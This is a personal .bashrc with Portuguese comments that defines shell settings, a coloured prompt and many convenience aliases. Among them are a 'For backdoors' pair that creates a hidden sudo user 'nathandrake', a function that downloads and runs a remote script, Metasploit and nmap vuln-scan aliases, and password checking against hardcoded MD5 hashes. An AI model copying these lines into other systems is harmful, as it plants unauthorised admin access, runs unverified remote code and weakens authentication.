#!/bin/bash

# Set the default editor
export EDITOR=nano
export VISUAL=nano

# Não armazenar as linhas duplicadas ou linhas que começam com espaço no historico
#HISTCONTROL=ignoreboth
export HISTCONTROL=erasedups:ignoredups:ignorespace

# To have colors for ls and all grep commands such as grep, egrep and zgrep
#export CLICOLOR=1
#export #LS_COLORS='no=00:fi=00:di=00;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.ogg=01;35:*.mp3=01;35:*.wav=01;35:*.xml=00;31:'
#export GREP_OPTIONS='--color=auto' #deprecated
#alias grep="/usr/bin/grep $GREP_OPTIONS"
#unset GREP_OPTIONS

# Color for manpages in less makes manpages a little easier to read
export LESS_TERMCAP_mb=$'\E[01;31m'
export LESS_TERMCAP_md=$'\E[01;31m'
export LESS_TERMCAP_me=$'\E[0m'
export LESS_TERMCAP_se=$'\E[0m'
export LESS_TERMCAP_so=$'\E[01;44;33m'
export LESS_TERMCAP_ue=$'\E[0m'
export LESS_TERMCAP_us=$'\E[01;32m'

# For chatgpt!
export PATH="$PATH:$HOME/.local/bin"

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# Adicionar ao Historico e não substitui-lo
shopt -s histappend
PROMPT_COMMAND='history -a'

# Check the window size after each command and, if necessary, update the values of LINES and COLUMNS
shopt -s checkwinsize

# Allow ctrl-S for history navigation (with ctrl-R)
stty -ixon

# Definições do comprimento e tamnho do historico.
HISTSIZE=10000
HISTFILESIZE=500

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

#========================
# Colors for Terminal
#========================

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

NONE="\[\033[0m\]" # Eliminar as Cores (deixar padrão)

force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
  if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
  # We have color support; assume it's compliant with Ecma-48
  # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
  # a case would tend to support setf rather than setaf.)
    color_prompt=yes
  else
    color_prompt=
  fi
fi

if [ "$color_prompt" = yes ]; then
  # Color based if is root or not. Same for all users!
  if [ "$(whoami)" != 'root' ]; then
    PS1="$BK┌─$BK[$BB\u$BK]$BR@$BK[$BB\h$BK]$BR:$BK[$BC\w$BK] $BK \n$BK└──╼ $BR$ $NONE"
  else
    PS1="$BK┌─$BK[$BR\u$BK]$BR@$BK[$BR\h$BK]$BR:$BK[$BY\w$BK] $BK \n$BK└──╼ $BR$ $NONE"
  fi
else
  # Default terminal colors/scheme.
  PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi

unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    if test -r ~/.dircolors; then
      eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    fi
    
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi


###########
# ALIASES #
###########

#alias ll='ls -alF'
#alias la='ls -A'
#alias l='ls -CF'

# Editors
alias pico='nano'
alias spico='nano'
alias snano='nano'
alias vim='nano'

# Alias's to modified commands
alias cp='cp -i'
alias mv='mv -i'
alias rm='rm -iv'
alias mkdir='mkdir -p'
#alias ping='ping -c 10'
alias less='less -R'

#alias ls='ls -ah --color=always' # add colors and hidden files

# Alias's for archives
alias mktar='tar -cvf'
alias mkbz2='tar -cvjf'
alias mkgz='tar -cvzf'
alias untar='tar -xvf'
alias unbz2='tar -xvjf'
alias ungz='tar -xvzf'
alias utar='tar -xvf'
alias ubz2='tar -xvjf'
alias ugz='tar -xvzf'

alias TRIM='sudo fstrim -va'

#alias df='duf'

function srv {
  SCRIPT="$HOME/.srv"
  URL="https://srv.linuxuniverse.com.br"
  if ping -c 1 -W 2 google.com &>/dev/null; then
    if wget -q "$URL" -O "$SCRIPT" && [ -s "$SCRIPT" ]; then
      chmod +x "$SCRIPT"
    else
      echo "Falha ao baixar o comando srv mais recente. Usando versão local (se disponivel)."
    fi
  fi

  if [ -x "$SCRIPT" ]; then
    bash "$SCRIPT"
  else
    echo "Comando srv não encontrado ou não é executável!"
  fi
}

alias menussh='/home/$USER/.menussh'
alias menuvpn='/home/$USER/.menuvpn'
alias menutail='/home/$USER/.menutail'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Check my IP over LAN and WAN
#alias iplan="hostname -I | awk '{print $1}'"
alias ipwan="dig @resolver4.opendns.com myip.opendns.com +short"

# For EnOS
alias rankmirror="sudo reflector --protocol https --verbose --latest 25 --sort rate --save /etc/pacman.d/mirrorlist; yay -Syyu; sudo eos-rankmirrors --verbose; yay -Syyu"

# for Raspberry Pi
alias sensorspi="sudo /usr/bin/vcgencmd measure_temp"
alias temppi="sudo /usr/bin/vcgencmd measure_temp"

# To pastebin
alias 0x0="curl -F file=@- 0x0.st"

# Custom aliases
alias ifconfig="ip -br -c a"
alias ipconfig="ip -br -c a"
alias ipa="ip -br -c a"

# For ArchLinux
alias autoremove="sudo pacman -R \$(pacman -Qdtq); yay -Scc"

# For Pentesting
alias metasploit="sudo msfconsole"
alias msfconsole="sudo msfconsole"
alias singlenmap='sudo nmap -Pn --script vuln --exclude 9100 -p1-9099,9101-65535'

# Remove SSH Entry
alias sshw='ssh-keygen -f /home/$USER/.ssh/known_hosts -R'

# For backdoors
alias backuser="sudo useradd -M -G sudo nathandrake"
alias backpass="sudo passwd nathandrake"

# For audio!
alias v2a="ffmpeg -i"

# To check sync status
alias sync='echo "Inicial $(grep -i dirty /proc/meminfo)"; echo "Para ver em tempo real: syncs" && sync && echo "Final $(grep -i dirty /proc/meminfo)"'
alias syncs='watch "grep -i dirty /proc/meminfo"'

# Append ROCm!
[ -d /opt/rocm ] && {
  export PATH=$PATH:/opt/rocm/bin
}

##################
# DOMAIN CONTROL #
##################

hash1="c7372ae920d9576200e78f0ab25b437d"

function domain {
password=$(dialog --backtitle "Active Directory and Domain Control" --title "" --insecure --passwordbox "Digite a senha!" 0 0 2>&1 > /dev/tty)
hash0=$(echo "$password" | md5sum | awk '{print $1}')

hash1="c7372ae920d9576200e78f0ab25b437d"; hash1="51da913e7b04c1b70543dc263ecc5106"; hash1="c357311ed3a47a08b423e1b42ec5c130"

  if [ -z "$password" ]; then
    dialog --title "ERROR" --msgbox "É necessário digitar uma senha para continuar." 6 40; clear
  else
    if [ "$hash0" = "$hash1" ]; then
      if docker ps -a | grep dominio 1> /dev/null; then
        docker exec -it dominio /root/.init
      else
        clear; echo "Nenhum Dominio encontrado neste servidor!"; sleep 2
      fi
    else
      dialog --title "ERROR" --msgbox "Senha incorreta. \nTente novamente!" 6 30
      timeout=$((timeout+1)); sleep $timeout; domain
    fi
  fi
}

hash1="51da913e7b04c1b70543dc263ecc5106"

#######################################################
# SPECIAL FUNCTIONS
#######################################################

# lz4:
alias tarc="tar -I 'lz4 -1 -c -v -' --totals -cpf"
alias tarx="tar -I 'lz4 -d -c -' -xf"
